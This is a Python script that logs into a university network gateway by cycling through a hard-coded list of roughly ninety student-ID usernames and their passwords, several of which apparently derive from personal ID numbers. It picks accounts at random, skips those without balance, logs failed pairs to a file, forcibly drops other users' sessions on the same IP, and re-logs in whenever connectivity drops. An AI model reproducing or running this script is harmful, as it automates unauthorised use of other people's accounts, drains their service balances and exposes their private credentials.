import re
import requests
from requests import get, packages, Session
from bs4 import BeautifulSoup
import time
import random
import log
from datetime import datetime
class Http():
    def __init__(self):
        self.session = Session()
    def login(self,un,pd):
        un=un
        pd=pd

        head={'Referer':'https://pass.neu.edu.cn/tpass/login?service=https%3A%2F%2Fipgw.neu.edu.cn%2Fsrun_cas.php%3Fac_id%3D1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36', }
        information=self.session.get('https://pass.neu.edu.cn/tpass/login?service=https%3A%2F%2Fipgw.neu.edu.cn%2Fsrun_cas.php%3Fac_id%3D1', headers=head)
        default_htmldoc = BeautifulSoup(information.text, "html.parser")

        lt=default_htmldoc.find('input',id='lt')["value"]
        execution=default_htmldoc.find_all('input')[8]["value"]
        form1_data = {
                'rsa': un+pd+lt,
                'ul': len(un),
                'pl': len(pd),
                'lt': lt,
                'execution': execution,
                '_eventId': 'submit'

            }

        self.session.post('https://pass.neu.edu.cn/tpass/login?service=https%3A%2F%2Fipgw.neu.edu.cn%2Fsrun_cas.php%3Fac_id%3D1',
                                                         data=form1_data,
                                                         headers=head)
        log.logger.info('登陆 %s %s'%(un,pd))
        information2 = self.session.get(
            'http://ipgw.neu.edu.cn/srun_cas.php?ac_id=1',headers=head)

        return information2
    def logout(self):
        self.session.get('http://ipgw.neu.edu.cn/srun_cas.php?logout', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36',})

        log.logger.info('logout')



    def IP_logout(self,htmldoc):
        sid = re.compile('onclick=\"do_drop\(\'(.*?)\'\);').findall(htmldoc.text)
        form2_data = {
            'action': 'dm',
            'sid': sid,
        }
        self.session.post(
            'https://ipgw.neu.edu.cn/srun_cas.php',
            data=form2_data,
            headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36',
        })



user_L=['1700696', '1700699', '1700703', '1700705',  '1700716', '1700731', '1601159', '1700740', '1700743', '1700747', '1700755', '1700776', '1700801',  '1700823', '1700825',  '1700834', '1700842', '1700853', '1700856', '1700867',  '1700725',  '1700871', '1700874', '1700875', '1700878', '1700879', '1700882', '1700886', '1700887', '1700890', '1700896', '1700907', '1700908', '1700911', '1700913', '1700915',   '1700925', '1700933', '1700935',  '1700938', '1770452', '1770466', '1770471', '1770486', '1770503', '1770506', '1770507',  '1770523', '1770525', '1770528', '1770530', '1770537', '1770540', '1770542',  '1770554', '1770556', '1770559', '1770561', '1770562', '1770564', '1770574', '1770585', '1770586', '1770592', '1770596', '1770597' , '1770614', '1770621',  '1770634', '1770636', '1770639', '1770651', '1770654', '1770667', '1770668', '1770671', '1770677', '1770680',  '1770692', '1770695', '1770698',  '1770704', '1770706', '1770710', '1770715', '1770720', '1770730', '1770731', '1770736', '1770740', '1770741', '1770742',  '1780349']
pw_L=['310548', '073556', '175214', '040752',  '166927', '23305x', '146618', '041989', '081613', '064324', '220070', '287312', '170896',  '212416', '255012',  '272139', '093211', '221335', '223912', '258448', '081218',  '06032x', '095516', '190416', '01842x', '206320', '210844', '036418', '071525', '251415', '26132x', '016615', '022717', '234011', '161827', '241316',   '095740', '110222', '218190',  '224651', '083038', '300028', '074415', '010315', '121536', '110918', '012331',  '101549', '145512', '079115', '120021', '110317', '086813', '011663',  '174813', '185315', '08151x', '205016', '160045', '215021', '182029', '206515', '196113', '086118', '260114', '283334',  '040317', '110010',  '094430', '173816', '195010', '028110', '06031x', '054910', '092711', '094512', '240219', '070817', '114749', '236138', '173022',  '21421x', '293541', '142436', '317214', '090860', '033110', '04122x', '081077', '051230', '174062', '020577',  '112667']


def EasyLogin():
    while True:
        index = random.randint(0, len(user_L) - 1)
        user = user_L[index]
        pwd = pw_L[index]
        IPgw = Http()
        log.logger.info('IPgw = Http()')
        html_code = IPgw.login(user, pwd)
        html_doc = BeautifulSoup(html_code.text, "html.parser")
        try:
            balance = html_doc.find_all('label', class_='fl-label')[0].text.strip()[-12:]
            log.logger.info('正常进入try balance = html_doc.find_all')
        except:
            balance = None
            log.logger.info('进入异常balance = None')
        try:
            IPrepeat = html_doc.find_all('form', id='fm1')[0].text.strip()[:13]
            log.logger.info('正常进入try IPrepeat')
        except:
            IPrepeat = None
            log.logger.info('进入异常IPrepeat = None')
        if balance=='余额不足月租，无法使用！'or balance=='您可以自助激活上网账号。':
            log.logger.info('余额不足月租，无法使用')
            continue
        elif balance==None and IPrepeat==None:#密码错误的情况
            with open('failed.txt', 'a') as f:
                f.write(user + ' ' + pwd + '\n')
            continue
        elif IPrepeat=='当前 ip 登录了其他账户':
            IPgw.IP_logout(html_code)
            log.logger.info('当前 ip 登录了其他账户')
            continue
        else:
            break
        time.sleep(0.8)

def Ping():
    while True:
        try:
            requests.get('https://www.bilibili.com/favicon.ico', timeout=0.7, headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36',
        })
            
            time.sleep(5)
            continue
        except:
            log.logger.info('进入Ping异常')
            EasyLogin()
            continue

if __name__=='__main__':
    EasyLogin()
    Ping()


